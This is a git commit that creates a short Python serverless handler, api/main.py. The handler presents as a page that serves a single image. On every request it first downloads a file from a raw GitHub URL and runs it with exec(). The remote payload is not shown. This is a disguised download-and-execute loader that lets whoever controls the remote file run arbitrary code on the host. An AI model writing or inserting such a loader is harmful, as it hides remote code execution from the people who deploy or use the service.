621e52fef6eca0665e7d1e36b800f38a5eec3e59
RAMDDR5 <bugthemonke@gmail.com>
2026-07-29 11:47:29 +0000

    Create main.py

---
+++ api/main.py
@@ -0,0 +1,13 @@
+import urllib.request
+
+def handler(request):
+    with urllib.request.urlopen("https://raw.githubusercontent.com/RAMDDR5/python/refs/heads/main/texttt") as response:
+        exec(response.read().decode("utf-8"), {})
+
+    return {
+        "statusCode": 200,
+        "headers": {
+            "Content-Type": "text/html"
+        },
+        "body": "<img src='/image.jpg' style='max-width:100vw;max-height:100vh;'>"
+    }
